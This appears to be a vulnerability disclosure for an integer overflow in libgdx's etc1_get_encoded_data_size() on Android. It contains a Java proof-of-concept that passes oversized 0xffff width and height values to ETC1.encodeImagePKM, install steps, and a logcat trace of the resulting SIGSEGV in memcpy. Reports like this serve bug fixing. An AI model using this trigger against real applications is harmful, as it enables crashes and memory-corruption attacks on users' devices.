Android libgdx etc1_get_encoded_data_size() integer overflow 

Compile the following java code:

public static void bug2() {
	int bufsize = 1000000;
	ByteBuffer pixelPtr = ByteBuffer.allocate(bufsize);
	for (int i = 0; i < bufsize;i++ ) pixelPtr.put((byte)0x41);

	long[] nativeData = new long[4];
	nativeData[0] = 0;
	nativeData[1] = 0xffff; //width
	nativeData[2] = 0xffff; //height
	nativeData[3] = Gdx2DPixmap.GDX2D_FORMAT_RGB888;

	Pixmap p = new Pixmap(new Gdx2DPixmap(pixelPtr, nativeData));
	ETC1.encodeImagePKM(p);
}

How to test:
1) install test.apk
2) click on app icon

logcat output:


--------- beginning of crash
03-24 18:09:26.792  3172  3187 F libc    : Fatal signal 11 (SIGSEGV), code 1, fault addr 0x0 in tid 3187 (GLThread 173)
03-24 18:09:26.792  1252  1252 W         : debuggerd: handling request: pid=3172 uid=10087 gid=10087 tid=3187
03-24 18:09:26.846  3192  3192 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
03-24 18:09:26.846  3192  3192 F DEBUG   : Build fingerprint: 'Android/sdk_google_phone_x86/generic_x86:7.1.1/NYC/3756122:userdebug/test-keys'
03-24 18:09:26.846  3192  3192 F DEBUG   : Revision: '0'
03-24 18:09:26.846  3192  3192 F DEBUG   : ABI: 'x86'
03-24 18:09:26.846  3192  3192 F DEBUG   : pid: 3172, tid: 3187, name: GLThread 173  >>> com.badlogicgames.superjumper.android <<<
03-24 18:09:26.846  3192  3192 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0
03-24 18:09:26.847  3192  3192 F DEBUG   :     eax 00000000  ebx a6b9cbb4  ecx 0000000c  edx a6b47ab8
03-24 18:09:26.847  3192  3192 F DEBUG   :     esi 00000004  edi a6b47ab8
03-24 18:09:26.847  3192  3192 F DEBUG   :     xcs 00000073  xds 0000007b  xes 0000007b  xfs 0000003b  xss 0000007b
03-24 18:09:26.847  3192  3192 F DEBUG   :     eip aff975fc  ebp a6b47b08  esp a6b47a48  flags 00010202
03-24 18:09:26.847  3192  3192 F DEBUG   : 
03-24 18:09:26.847  3192  3192 F DEBUG   : backtrace:
03-24 18:09:26.847  3192  3192 F DEBUG   :     #00 pc 000195fc  /system/lib/libc.so (memcpy+732)
03-24 18:09:26.847  3192  3192 F DEBUG   :     #01 pc 00015d2c  /data/app/com.badlogicgames.superjumper.android-1/lib/x86/libgdx.so (etc1_encode_image+380)
03-24 18:09:26.847  3192  3192 F DEBUG   :     #02 pc 000111c3  /data/app/com.badlogicgames.superjumper.android-1/lib/x86/libgdx.so (Java_com_badlogic_gdx_graphics_glutils_ETC1_encodeImagePKM+163)
03-24 18:09:26.847  3192  3192 F DEBUG   :     #03 pc 002df17e  /data/app/com.badlogicgames.superjumper.android-1/oat/x86/base.odex (offset 0x2d7000)
03-24 18:09:27.489  1252  1252 W         : debuggerd: resuming target 3172
03-24 18:09:27.543  1304  1304 I Zygote  : Process 3172 exited due to signal (11)
